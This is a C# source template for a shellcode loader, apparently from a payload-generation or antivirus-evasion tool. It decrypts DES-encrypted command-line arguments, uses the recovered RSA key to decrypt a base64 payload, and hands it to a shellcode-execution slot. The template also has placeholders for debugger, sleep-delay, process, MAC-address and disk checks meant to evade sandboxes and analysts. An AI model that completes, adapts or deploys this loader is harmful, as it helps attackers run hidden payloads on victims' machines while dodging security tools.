using System;
using System.IO;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace shellcode
{
	[ComVisible(true)]
    class Program
    {
	    public static string Decrypt(string Text, string key, string iv)
        {
            DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
            int num = Text.Length / 2;
            byte[] array = new byte[num];
            for (int i = 0; i < num; i++)
            {
                int num2 = Convert.ToInt32(Text.Substring(i * 2, 2), 16);
                array[i] = (byte)num2;
            }
            descryptoServiceProvider.Key = Encoding.ASCII.GetBytes(key);
            descryptoServiceProvider.IV = Encoding.ASCII.GetBytes(iv);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(array, 0, array.Length);
            cryptoStream.FlushFinalBlock();
            return Encoding.Default.GetString(memoryStream.ToArray());
        }
		
{{CheckDelayMethod_Here}}

        static string execute_process(string file, string args = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }

{{CheckProcessMethod_Here}}

{{CheckMACMethod_Here}}
		
{{CheckDiskMethod_Here}}

        static void Main(string[] args)
        {
{{CheckDebugger_Here}}

{{CheckDelay_Here}}

{{CheckProcess_Here}}

{{CheckMAC_Here}}
			
{{CheckDisk_Here}}


            if (args.Length == 2)
            {
                string privateKey = Decrypt(args[0], "{{Decrypt_Key_Here}}", "{{Decrypt_IV_Here}}");
                string encryptData = Decrypt(args[1], "{{Decrypt_Key_Here}}", "{{Decrypt_IV_Here}}");
				
				RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
				rsa.FromXmlString(privateKey);
				byte[] encryptedData = Convert.FromBase64String(encryptData);
				byte[] decryptedData = null;
				int DecryptedSize = 0;
				if (encryptedData.Length > 128)
				{
					ArrayList arrDecrypteToTxt = new ArrayList();
					decryptedData = DecryptedDataMethod(rsa, encryptedData, arrDecrypteToTxt, DecryptedSize);
				}
				else
				{
					decryptedData = rsa.Decrypt(encryptedData, false);
				}
				string payload = Encoding.Default.GetString(decryptedData);
				byte[] mydata = Convert.FromBase64String(payload);
{{Execute_Shellcode}}
            }

        }
{{Execute_Shellcode_Method}}
        private static byte[] DecryptedDataMethod(RSACryptoServiceProvider rsa, byte[] orgData, ArrayList arrDecrypteToTxt, int DecryptedSize)
        {
            byte[] DecryptedData = null;
            try
            {
                string strDecrypteToTxt = "";
                byte[] temp = null;
                byte[] tempDecryptedData = null;
                if (orgData.Length > 128)
                {
                    temp = new byte[128];
                    for (int i = 0; i < 128; i++)
                    {
                        temp[i] = orgData[i];
                    }
                }
                else
                {
                    temp = orgData;
                }
                tempDecryptedData = rsa.Decrypt(temp, false);
                DecryptedSize += tempDecryptedData.Length;
                strDecrypteToTxt = Convert.ToBase64String(tempDecryptedData);
                arrDecrypteToTxt.Add(strDecrypteToTxt);

                if (orgData.Length > 128)
                {
                    byte[] again = new byte[orgData.Length - 128];
                    int j = 0;
                    for (int i = 128; i < orgData.Length; i++)
                    {
                        again[j] = orgData[i];
                        j++;
                    }
                    return DecryptedDataMethod(rsa, again, arrDecrypteToTxt, DecryptedSize);
                }
                else
                {
                    DecryptedData = new byte[DecryptedSize];
                    Byte[] btFromBase64 = null;

                    int p = 1;
                    int currentAddr = 0;
                    int k = 0;
                    double dk = 0;
                    dk = Math.Floor((double)(DecryptedSize / 117));
                    k = (int)dk;
                    int n = 0;
                    foreach (string strArr in arrDecrypteToTxt)
                    {
                        if (n < k)
                        {
                            btFromBase64 = Convert.FromBase64String(strArr);
                            btFromBase64.CopyTo(DecryptedData, n * 117);
                            currentAddr = p * 117;
                            p++;
                            n++;
                        }
                        else
                        {
                            btFromBase64 = Convert.FromBase64String(strArr);
                            btFromBase64.CopyTo(DecryptedData, currentAddr);
                        }

                    }
                }

            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
            return DecryptedData;
        }
    }
}